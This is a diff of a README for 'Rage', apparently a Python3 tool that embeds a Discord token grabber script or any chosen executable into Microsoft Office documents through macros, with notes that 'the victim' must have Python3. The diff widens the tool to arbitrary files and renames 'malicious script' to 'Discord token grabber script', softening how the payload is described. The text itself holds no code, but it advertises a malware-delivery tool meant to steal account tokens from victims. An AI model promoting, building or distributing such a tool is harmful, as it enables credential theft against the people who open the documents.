@@ -11,9 +11,9 @@
 <br><br>
 <p align="center">
 <strong>
-Rage is a tool written in Python3 allowing you to inject a
+Rage is a tool written in Python3 allowing you to inject any file in a Microsoft Office Document, you can
 <br>
-Python3 complete <a href="https://github.com/billythegoat356/Riot">Discord token grabber (Riot)</a> script in a Microsoft Document using macros.
+choose between a custom file (.exe, .py, etc) or a Python3 complete <a href="https://github.com/billythegoat356/Riot">Discord token grabber (Riot)</a> script in a Microsoft Document using macros.
 </strong>
 </p>
 <br>
@@ -37,7 +37,7 @@ Python3 complete <a href="https://github.com/billythegoat356/Riot">Discord token
 <br>
 <strong>- Not automatic, you will have to follow the tutorial and create the macro yourself</strong>
 <br>
-<strong>- The victim needs Python3 to execute the malicious script</strong>
+<strong>- The victim needs Python3 to execute the Discord token grabber script</strong>
 <br><br>
 
 -----
@@ -60,7 +60,6 @@ Python3 complete <a href="https://github.com/billythegoat356/Riot">Discord token
 <p align="center"><strong><i>Feel free to make a pull request on this repository to submit any idea!</i></strong</p>
 
 <br><br>
-* Allow the user to choose a file to be injected in the Microsoft Document
 * Automatise the creation of the macro
 <br><br>
   
